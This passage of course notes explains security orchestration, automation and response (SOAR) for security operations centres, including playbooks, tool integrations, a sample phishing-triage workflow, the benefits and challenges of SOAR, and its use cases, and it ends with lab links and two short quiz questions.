humans.\nPlaybooks: Playbooks, also called runbooks, are task-based graphical workflows that help visualize processes across security products. These playbooks can be fully automated, fully manual, or anywhere in between.\nHow to create an incident response playbook: https://www.techtarget.com/searchsecurity/tip/How-to-create-an-incident-response-playbook\nIntegrations: Product integrations or apps are mechanisms through which security orchestration platforms communicate with other products. These integrations can be executed through Representational State Transfer (REST) APIs, webhooks (The use of webhooks allows web applications to automatically communicate with other web-apps.), and other techniques. An integration can be unidirectional or bidirectional. Bidirectional integrations allow both products to execute cross console actions.\nIngestion: Ingestion is a name given to the process through which security orchestration tools consume alerts from other security products.\nSecurity information and event management (SIEM): SIEM tools monitor various sources for machine data, correlate and aggregate them for context, and provide real-time detection and monitoring of alerts generated by applications and network hardware. These tools are useful for alert detection and initial enrichment.\nThreat intelligence: Threat intelligence tools collect and correlate data from external and internal sources to provide information regarding the malice of an incident or indicator. These tools are useful for alert enrichment.\nEndpoint security: Endpoint security tools are responsible for the protection of devices such as laptops, mobile phones, and desktops that are connected to organizational networks. These tools help with detection, enrichment, and response actions.\nNetwork security: Network security tools involve both hardware and software that protect the underlying network infrastructure from misuse or compromise. These tools are a critical part of alert detection.\n\nEmail and web gateways: Email and web gateway tools are designed to prevent the transmission of emails or access of websites that break company policy or result in information transfer with malicious intent. These tools are important for response and enforcement.\nTicketing systems: Within security, ticketing systems are usually responsible for assigning tasks, capturing the flow of an incident, and helping deal with incidents in a more effective manner.\nVulnerability management: Vulnerability management tools are responsible for uncovering any potential weaknesses in existing organizational systems that can be exploited by malicious actors.\nCloud Access Security Broker (CASB): For organizations with cloud-based resources, CASBs act as a middle layer between customers and providers to ensure enterprise security policy enforcement.\nUser and Entity Behavior Analytics (UEBA): UEBA tools monitor and analyze the behavior of users and entities to detect anomalous and potentially malicious intrusions into organizational systems.\n\n6.2 Implementing automation in SOC workflows.\n Security orchestration tools integrate with all the other security tools (and many non-security tools) that an organization uses to provide teams with a central console to coordinate and activate all these tools. \nThese integrations enable inter-product conversations, data transfer, and remote execution of commands. \nProduct integrations or apps are mechanisms through which security orchestration platforms communicate with other products to enable data transfer and remote execution of commands\nThese product integrations are possible through a range of mechanisms, such as REST APIs, SOAP APIs, SSH, SQL, and HTTPS. \nusing SOAP when designing APIs focuses on the message, whereas using REST when designing APIs focuses on defining them as resources. \nThe connective mechanism depends on the types of products being integrated, which in turn influences the depth and fidelity of data transfer that’s allowed between the two integrated products. \nSo, if a security orchestration tool integrates with another tool, what possible actions can be executed through the integration? \nIngestion of security data: If the security orchestration tool integrates with a product that’s responsible for alert detection (like a SIEM), the security orchestration platform can ingest this alert data in an automated or manual fashion. Once ingested, this alert data can automatically be driven to response through playbooks. \nEnrichment of security data: If the security orchestration tool integrates with a product that’s responsible for providing additional context to an alert (like a threat intelligence tool), security teams can use the integration to access this additional context within the security orchestration tool in an automated or manual fashion and find out more about an alert. \nResponse actions: If the security orchestration tool integrates with a product that’s responsible for enforcement and response actions (like an endpoint security tool), security teams can use the integration to execute these response actions from within the security orchestration tool in an automated or manual fashion. \nOperational and engagement actions: If the security orchestration tool integrates with a product that’s responsible for maintaining operational efficiency or end user engagement (like ticketing systems and email tools respectively), security teams can use the integration to automate actions, such as creating a ticket or sending an email to a hacked employee.\nScenario:\n THM Corp employees have recently received numerous suspicious emails and have reported them to the SOC team for investigation. As the lead analyst, you wish to develop an automated workflow to analyse email files and perform case management using various security tools.\n SOAR Workflows (Phishing Workflow)\nScenario: THM Corp employees have recently received numerous suspicious emails and have reported them to the SOC team for investigation. As the lead analyst, you wish to develop an automated workflow to analyse email files and perform case management using various security tools.\nPhishing attacks remain the most common attack vector used in breaches. Unfortunately for security analysts, investigating phishing emails becomes time-consuming and involves manual exercises such as analysing attachments and URLs. \nSOAR solutions can execute these tasks in the background while other investigations are ongoing. Additionally, remediation can be performed when a positive phishing email is identified.\nNow, what would this workflow look like? Let’s build a flow of events using our scenario as a security analyst assigned to the incident.\nPhishing Workflow\nThe suspected emails have been received and isolated in a sandbox environment prepared for such events.\nA trigger is executed to create a ticket on the case management solution (such as TheHive). This will allow for better documentation and follow-up on the incident.\nParse the email for URLs, attachments and other possible IOCs. If any IOCs are present, they will be extracted.\nFile hashes will be generated for extracted attachments.\nA VirusTotal trigger is executed to analyse extracted URLs and file hashes.\nIn the event there are no results from VirusTotal, a manual email analysis has to be done to ensure whether it is malicious.\nMalicious outcomes from automated or manual analysis trigger a deletion of the malicious email and a communication notification to the organisation.\nThe incident ticket is updated with IOCs’ results and reports generated.\nEnd of workflow.\n6.3 Benefits and challenges of orchestration\nAutomating one task may impress one team by expediting a particular task. \nAn example might be automating a task to assign a port with encapsulation VLAN on an ACI leaf so that virtual machine (VM) traffic can be initiated; this task automation might get you some applause from a small group of individuals, but it will not make a perceivable difference in the overall rapid application development process. When automation is built into a series of processes and workflows, which are then orchestrated to run automatically, there can be endless benefits.\nSome of the commonly observed benefits of automation and orchestration include the following:\nRapid and consistent changes, Simplicity, \nReducing human error, Making changes on the fly\nService catalog offerings for end users, Quick recovery after disaster,Cost reduction\nWhat are the benefits of SOAR Platform?\n Faster incident detection and reaction times. The volume and velocity of security threats and events are constantly increasing. SOAR's improved data context, combined with automation, can lower mean time to detect, or MTTD, and speed up mean time to respond, or MTTR. By detecting and responding to threats more quickly -- through automated playbooks, when available -- their effects can be lessened.\nBetter threat context. By integrating more data from a wider array of tools and systems, SOAR platforms can offer more context, better analysis and up-to-date threat information.\nSimplified management. SOAR platforms consolidate various security systems' dashboards into a single interface. This helps SecOps and other teams by centralizing information and data handling, simplifying management and saving time.\nScalability. Scaling time-consuming manual tasks can be a drain on employees and even impossible to keep up with as security event volume grows. The orchestration, automation and workflows can meet scalability demands more easily.\nBoosted analyst productivity. Automating lower-level threats augments SecOps and security operations center (SOC) teams' responsibilities, enabling them to prioritize tasks more effectively and respond to threats that require human intervention more quickly.\nStreamlined operations. Standardized procedures and playbooks that automate lower-level tasks enable SecOps teams to respond to more threats in the same time period. These automated workflows also ensure the same standardized remediation efforts are applied organization-wide across all systems.\nReporting and collaboration. SOAR platforms' reporting and analysis consolidate information quickly, enabling better data management processes and better response efforts to update existing security policies and programs for more effective security. A SOAR platform's centralized dashboard can also improve information sharing across disparate enterprise teams, enhancing communication and collaboration.\nLowered costs. In many instances, augmenting security analysts with SOAR tools can lower costs, as opposed to manually performing all threat analysis, detection and response workflows.\n\nWhat are the challenges of SOAR?\nSOAR is not a silver-bullet technology, nor is it a standalone system. SOAR platforms should be part of a defense-in-depth security strategy, especially as they require the input of other security systems to successfully detect threats.\nSOAR is a complementary technology, not a substitution for other security tools. SOAR platforms are not a replacement for human analysts, but instead can augment their skills and workflows for more effective incident detection and response.\nOther potential drawbacks of SOAR include the following:\nFailure to remediate a broader security strategy.\nConflated expectations.\nIntegration complexities.\nDeployment and management complexity.\nLack of or limited metrics.\n\nDifficulties in SOAR\nThe primary difficulties in Security Orchestration, Automation, and Response (SOAR) include:\nComplex Integration Issue: Incorporating SOAR with current security tools and systems can be intricate and time-intensive. Ensuring seamless collaboration among all components and the smooth flow of data poses a considerable challenge.\nChallenge of Customization and Workflow Design: Developing and tailoring workflows and playbooks to align with an organization’s specific security procedures and requirements can be demanding. It necessitates expertise in both security operations and automation.\nSkill Gap and Training Dilemma: Efficiently utilizing SOAR demands skilled personnel who grasp cybersecurity practices and the technical intricacies of the SOAR platform. Training existing staff or finding qualified individuals can be problematic.\nOptimizing Alerts and Workflows: Overcoming alert overload and fine-tuning automated workflows and playbooks to minimize instances of incorrect alerts is a persistent challenge that mandates constant monitoring and adjustment.\n\nSOAR vs SIEM\u000b\n6.4 Use cases for SOC automation\nGiven the value of digitized business assets and the widening topology of IT infrastructure and big data, organizations face a pressing question: How should they respond to the increasing volume and variety of threats?\nMany companies are starting to automate foundational security operations center (SOC) tasks. \nAutomation helps increase the speed and agility of identifying and remediating threats, while simultaneously reducing the amount of human time and effort required to accomplish these tasks. \nSOAR is a class of technologies designed to automate these types of security workflows. SOAR encompasses the following functions in a SOC context:\nSecurity orchestration connects and coordinates with multiple heterogeneous tool sets -- both internal and external to the organization -- in the SOC for more efficient threat ingestion, enrichment, monitoring and incident identification.\nAutomation helps SOCs take a more proactive security stance by automatically triggering workflows, tasks and alert triages based on predefined parameters.\nResponse accelerates general and targeted SOC reactions to lower-risk incidents and supports analyst retort by enabling a single view to access, query and share threat intelligence.\n1. Threat intelligence coordination\nEach day, SOAR platforms ingest hundreds of thousands of indicators of compromise (IOCs). \nIOCs are collected from internal and external threat intelligence feeds, malware analysis tools, endpoint detection and response platforms, SIEM systems, network detection and response tools, email inboxes, RSS feeds, regulatory bodies and other databases. \nSOAR platforms can coordinate, aggregate and surface alerts from those tools, as well as detect suspicious IOCs that emerge across them.Each day, SOAR platforms ingest hundreds of thousands of indicators of compromise (IOCs). \nIOCs are collected from internal and external threat intelligence feeds, malware analysis tools, endpoint detection and response platforms, SIEM systems, network detection and response tools, email inboxes, RSS feeds, regulatory bodies and other databases. \nSOAR platforms can coordinate, aggregate and surface alerts from those tools, as well as detect suspicious IOCs that emerge across them.\n2. Case management\nPotential security threats can be detected by multiple tools. Thus, it can consume precious amounts of time for analysts to parse through disparate data associated with the same threat. SOAR in the SOC collates all the data toward a single story consisting of multiple correlated events. This enables case managers to identify the most important threats so they can be handled rapidly, which accelerates overall mean times to detect and respond, whether through automation or human intervention and analysis.\n4. Automated enrichment for remediation\nIn the past, SOC analysts relied on manual management and inventory of security vulnerabilities. \nBut by implementing SOAR, several SOC tasks can be automated to handle volume, monitoring and simple responses. \nSpecifically, SOAR correlates data on threats across multiple security tools to calculate risk and prioritize the threat accordingly.\n\n3. Vulnerability management\nSOAR platforms accelerate the IOC enrichment process by tapping multiple enrichment databases or querying different threat intelligence tools for context. \nThis enables SOC analysts to more accurately and efficiently parse, verify, triage and respond. \nThis SOAR use case saves analysts significant time by more rapidly enriching huge volumes of IPs, URLs and hashes to check for malice -- without compromising on the depth of inquiry needed.\n5. Threat hunting\nBeyond ingestion and enrichment, SOAR platforms' detection of IOCs effectively serves as a form of proactive threat hunting. Threat hunting is a crucial task for human analysts -- but a time-consuming one, given the widening scope of threats. SOAR helps with tedium and scale by adding data sets for continual analysis. Additionally, SOAR assists with the threat hunting scope by probing for malware or suspicious domains and incorporating human-in-the-loop decisioning at strategic points.\n6. Incident response\nAutomating incident remediation and response processes is intended to target threats upstream to prevent downstream costs. SOAR in the SOC handles remediation and response for several common security threats, such as phishing, malware, DoS, web defacement and ransomware.\n\nAutomated responses take myriad forms depending on the nature of the threat\nAuto-adding indicators to watchlists.\nAuto-blocking malicious indicators.\nAuto-quarantining indicators or compromised endpoints.\nAuto-patching of infrastructure hardware/software.\nAuto-generating tickets.\nAuto-blocking a suspicious email or IP address.\nAuto-deleting suspicious emails from other mailboxes.\nAuto-terminating user accounts.\nAuto-triggering an antivirus scan or security compliance check.\nAuto-alerting specific analysts, employees, vendors, partners or customers.\n\nSOAR Use Cases\u000bThe table that follows offers examples of common use cases for SOAR\nLab Activity: SOAR tools\nThe tools that will be covered are as follows:\n\nMicrosoft Sentinel SOAR\nSplunk SOAR (Phantom)\nGoogle Chronicle SOAR (Siemplify)\nSOAR Tools and Automation Hands-On Examples\nhttps://learning.oreilly.com/library/view/security-orchestration-automation/9781803242910/B18028_TOC_ePub.xhtml\nSOAR Hello World: https://www.youtube.com/watch?v=Boe1GiD6bfs\n\n\nQuestion 1:\u000bThe act of connecting and integrating security tools and systems into seamless workflows is known as?\n Answer 1: Security Orchestration\n\nQuestion 2: What do we call a predefined list of actions to handle an incident?\nAnswer 2: Playbooks\n\nInvestigating cases and alerts using Chronicle SOAR\nInvestigating cases and alerts using Chronicle SOAR\nhttps://cloud.google.com/chronicle/docs/soar/overview-and-introduction/soar-overview\n\nWorking with cases\nWorking with alerts\nIncident response exercise scenarios\nHow to build an incident response plan, with examples, template?\n\nhttps://www.techtarget.com/searchsecurity/feature/5-critical-steps-to-creating-an-effective-incident-response-plan\n\nQuick Dig into SOAR Tools: https://learning.oreilly.com/library/view/security-orchestration-automation/9781803242910/B18028_04.xhtml#_idParaDest-59\n\nHow to build an incident response plan, with examples, template https://www.techtarget.com/searchsecurity/feature/5-critical-steps-to-creating-an-effective-incident-response-plan\n"
}